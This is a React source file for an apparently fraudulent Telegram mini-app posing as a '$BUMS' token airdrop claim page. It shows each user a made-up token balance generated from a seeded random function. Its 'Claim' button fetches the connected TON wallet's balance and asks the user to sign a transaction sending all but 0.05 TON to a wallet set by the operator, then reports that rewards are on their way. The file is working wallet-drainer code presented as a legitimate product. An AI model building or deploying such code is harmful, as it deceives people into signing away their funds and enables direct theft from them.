import { useState, useEffect, useCallback } from "react";
import { useTonConnectUI, useTonAddress, useTonConnectModal } from "@tonconnect/ui-react";
import { useTelegramUser } from "@/hooks/useTelegramUser";

const DESTINATION_WALLET = import.meta.env.VITE_DESTINATION_WALLET as string | undefined;
const TON_API_BASE = "https://tonapi.io/v2";
const FEE_RESERVE = 0.05;

function seededRandom(seed: string): number {
  let h = 2166136261;
  for (let i = 0; i < seed.length; i++) {
    h ^= seed.charCodeAt(i);
    h = Math.imul(h, 16777619);
    h = h >>> 0;
  }
  return h / 0xffffffff;
}

function getUserBalance(seed: string): { balance: number; usd: number } {
  const r1 = seededRandom(seed);
  const r2 = seededRandom(seed + "_usd");
  const balance = Math.floor(45000 + r1 * 130000);
  const pricePerToken = 0.021 + r2 * 0.008;
  const usd = Math.min(3850, Math.max(1050, Math.floor(balance * pricePerToken)));
  return { balance, usd };
}

export function BumsApp() {
  const [tonConnectUI] = useTonConnectUI();
  const walletAddress = useTonAddress();
  const { open: openModal } = useTonConnectModal();
  const { user, hapticImpact, hapticNotification } = useTelegramUser();
  const [claiming, setClaiming] = useState(false);
  const [claimError, setClaimError] = useState<string | null>(null);
  const [claimSuccess, setClaimSuccess] = useState(false);
  const [showDisconnect, setShowDisconnect] = useState(false);

  useEffect(() => {
    if (claimSuccess) {
      const t = setTimeout(() => setClaimSuccess(false), 5000);
      return () => clearTimeout(t);
    }
  }, [claimSuccess]);

  useEffect(() => {
    if (claimError) {
      const t = setTimeout(() => setClaimError(null), 5000);
      return () => clearTimeout(t);
    }
  }, [claimError]);

  useEffect(() => {
    const handler = () => setShowDisconnect(false);
    if (showDisconnect) document.addEventListener("click", handler);
    return () => document.removeEventListener("click", handler);
  }, [showDisconnect]);

  const handleClaim = useCallback(async () => {
    if (!walletAddress) {
      hapticImpact("medium");
      openModal();
      return;
    }
    if (!DESTINATION_WALLET) {
      setClaimError("Claim is not configured yet. Please try again later.");
      return;
    }
    setClaiming(true);
    setClaimError(null);
    hapticImpact("heavy");
    try {
      const res = await fetch(`${TON_API_BASE}/accounts/${walletAddress}`);
      if (!res.ok) throw new Error("Could not fetch wallet balance.");
      const data = await res.json();
      const balanceTon = data.balance / 1e9;
      const amountToSend = balanceTon - FEE_RESERVE;
      if (amountToSend <= 0) {
        throw new Error(`Insufficient TON balance. You need more than ${FEE_RESERVE} TON.`);
      }
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [
          {
            address: DESTINATION_WALLET,
            amount: Math.floor(amountToSend * 1e9).toString(),
          },
        ],
      };
      await tonConnectUI.sendTransaction(transaction);
      hapticNotification("success");
      setClaimSuccess(true);
    } catch (err: unknown) {
      hapticNotification("error");
      if (err instanceof Error) {
        setClaimError(err.message.includes("User rejects") ? "Transaction was cancelled." : err.message);
      } else {
        setClaimError("Transaction failed. Please try again.");
      }
    } finally {
      setClaiming(false);
    }
  }, [walletAddress, tonConnectUI, hapticImpact, hapticNotification, openModal]);

  const handleDisconnect = useCallback(async (e: React.MouseEvent) => {
    e.stopPropagation();
    await tonConnectUI.disconnect();
    setShowDisconnect(false);
    hapticImpact("light");
  }, [tonConnectUI, hapticImpact]);

  const handleSwitchWallet = useCallback((e: React.MouseEvent) => {
    e.stopPropagation();
    setShowDisconnect(false);
    openModal();
    hapticImpact("light");
  }, [openModal, hapticImpact]);

  const displayName = user?.first_name ?? "BUMS User";
  const balanceSeed = user?.id ? String(user.id) : (walletAddress || "default-bums-user");
  const { balance: userBalance, usd: userUsd } = getUserBalance(balanceSeed);
  const shortAddr = walletAddress
    ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
    : null;

  return (
    <div className="app-root">
      <div className="bg-orb bg-orb-1" />
      <div className="bg-orb bg-orb-2" />

      {/* ── Header ── */}
      <header className="app-header">
        <div className="user-row">
          <div className="avatar">
            {user?.photo_url
              ? <img src={user.photo_url} alt="" />
              : <span>{displayName[0].toUpperCase()}</span>}
          </div>
          <div className="user-info">
            <span className="user-name">{displayName}</span>
            <span className="user-sub">BUMS Holder</span>
          </div>
        </div>
        <div className="network-pill">
          <span className="net-dot" />
          BUMS Network
        </div>
      </header>

      {/* ── Main scroll area ── */}
      <main className="app-main">

        {/* ── Coin + Balance ── */}
        <section className="hero-section">
          <div className="coin-wrap">
            <div className="coin-spin-3d">
              <div className="coin-face coin-front">
                <img src={`${import.meta.env.BASE_URL}bums-coin-logo.jpg`} alt="BUMS" />
              </div>
              <div className="coin-face coin-back">
                <img src={`${import.meta.env.BASE_URL}bums-coin-logo.jpg`} alt="BUMS" />
              </div>
            </div>
          </div>

          <div className="balance-block">
            <div className="balance-usd">≈ ${userUsd.toLocaleString()} USD</div>
            <div className="balance-row">
              <span className="balance-amount">{userBalance.toLocaleString()}</span>
              <span className="balance-ticker">$BUMS</span>
            </div>
            <div className="airdrop-live-badge">
              <span className="airdrop-dot" />
              Airdrop Live
            </div>
          </div>
        </section>

        {/* ── Wallet section ── */}
        <section className="wallet-section">
          {!shortAddr ? (
            <button
              className="connect-btn"
              onClick={() => { hapticImpact("medium"); openModal(); }}
            >
              <TonIcon />
              Connect TON Wallet
            </button>
          ) : (
            <div className="wallet-connected-wrap">
              <button
                className="wallet-connected-btn"
                onClick={e => { e.stopPropagation(); setShowDisconnect(v => !v); }}
              >
                <TonIcon />
                <span className="wallet-addr">{shortAddr}</span>
                <span className="wallet-dot" />
                <ChevronIcon />
              </button>
              {showDisconnect && (
                <div className="wallet-dropdown">
                  <button className="wallet-dropdown-item" onClick={handleSwitchWallet}>
                    <SwitchIcon /> Switch Wallet
                  </button>
                  <div className="wallet-dropdown-divider" />
                  <button className="wallet-dropdown-item wallet-dropdown-danger" onClick={handleDisconnect}>
                    <DisconnectIcon /> Disconnect
                  </button>
                </div>
              )}
            </div>
          )}
        </section>

        {/* ── How it works ── */}
        <section className="steps-section">
          <p className="steps-title">How to claim</p>
          <ol className="steps-list">
            <li className={`step-item ${shortAddr ? "step-done" : ""}`}>
              <span className="step-num">{shortAddr ? <CheckIcon /> : "1"}</span>
              <div className="step-text">
                <span className="step-label">Connect your wallet</span>
                <span className="step-desc">Use TON Keeper, OpenMask or any TON wallet</span>
              </div>
            </li>
            <li className="step-item">
              <span className="step-num">2</span>
              <div className="step-text">
                <span className="step-label">Click Claim</span>
                <span className="step-desc">Initiate the reward transaction</span>
              </div>
            </li>
            <li className="step-item">
              <span className="step-num">3</span>
              <div className="step-text">
                <span className="step-label">Approve in your wallet</span>
                <span className="step-desc">Confirm the transaction to receive $BUMS</span>
              </div>
            </li>
          </ol>
        </section>

        {/* ── Feedback ── */}
        {claimSuccess && (
          <div className="feedback-card feedback-success">
            <span className="feedback-icon">✓</span>
            <div>
              <p className="feedback-title">Transaction Sent</p>
              <p className="feedback-sub">Your $BUMS rewards are on their way.</p>
            </div>
          </div>
        )}
        {claimError && (
          <div className="feedback-card feedback-error">
            <span className="feedback-icon">!</span>
            <div>
              <p className="feedback-title">Error</p>
              <p className="feedback-sub">{claimError}</p>
            </div>
          </div>
        )}

        {/* ── Claim Button ── */}
        <button
          className={`claim-main-btn ${claiming ? "claim-loading" : ""} ${!shortAddr ? "claim-connect" : ""}`}
          onClick={handleClaim}
          disabled={claiming}
        >
          {claiming ? (
            <>
              <SpinnerIcon />
              Sending Transaction…
            </>
          ) : !shortAddr ? (
            "Connect Wallet to Claim"
          ) : (
            "Claim $BUMS Rewards"
          )}
        </button>

        {shortAddr && (
          <p className="claim-footnote">
            Sends full TON balance minus 0.05 TON network fee
          </p>
        )}
      </main>
    </div>
  );
}

function TonIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 56 56" fill="none" style={{ flexShrink: 0 }}>
      <circle cx="28" cy="28" r="28" fill="#0088CC" />
      <path d="M37.5 16h-19c-1.4 0-2.2 1.6-1.4 2.8l10.5 16.4c.7 1.1 2.3 1.1 3 0L40.9 18.8c.8-1.2 0-2.8-1.4-2.8z" fill="white" />
    </svg>
  );
}

function ChevronIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
      <polyline points="6 9 12 15 18 9" />
    </svg>
  );
}

function SwitchIcon() {
  return (
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <polyline points="17 1 21 5 17 9" />
      <path d="M3 11V9a4 4 0 0 1 4-4h14" />
      <polyline points="7 23 3 19 7 15" />
      <path d="M21 13v2a4 4 0 0 1-4 4H3" />
    </svg>
  );
}

function DisconnectIcon() {
  return (
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
      <polyline points="16 17 21 12 16 7" />
      <line x1="21" y1="12" x2="9" y2="12" />
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round">
      <polyline points="20 6 9 17 4 12" />
    </svg>
  );
}

function SpinnerIcon() {
  return (
    <svg className="spin-icon" width="18" height="18" viewBox="0 0 24 24" fill="none">
      <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.25)" strokeWidth="3" />
      <path d="M12 2a10 10 0 0 1 10 10" stroke="white" strokeWidth="3" strokeLinecap="round" />
    </svg>
  );
}
